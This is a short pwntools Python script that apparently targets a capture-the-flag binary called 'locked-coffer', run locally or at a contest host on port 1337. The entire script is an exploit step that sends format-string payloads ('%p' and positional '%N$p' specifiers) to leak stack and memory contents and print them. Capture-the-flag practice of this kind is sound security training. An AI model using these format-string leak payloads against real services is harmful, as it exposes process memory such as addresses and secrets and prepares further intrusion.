from pwn import *

local = True
if local:
    elf = ELF('locked-coffer')
    s = elf.process()
    print(elf.symbols)
else:
    host, port = 'lockedcoffer.tghack.no', 1337
    s = remote(host,port)
s.recvuntil('> ')
log.info("Sending %p's")
s.sendline('%p-%p-%p-%p-%p-AAAAAAAA-BBBBBBBB')
mem = s.recv()
print(mem)

#s.recvuntil('>')
s.sendline("%1$p-%3$p-%4$p-%6$p-%7$p-%8$p-%9$p-%10$p-%11$p-%12$p-%13$p-%14$p-%15$p-%16$p-%17$p-%18$p-%19$p-%20$p-%21$p-%22$p-%23$p-%25$p-")
resp = s.recv()
print(resp)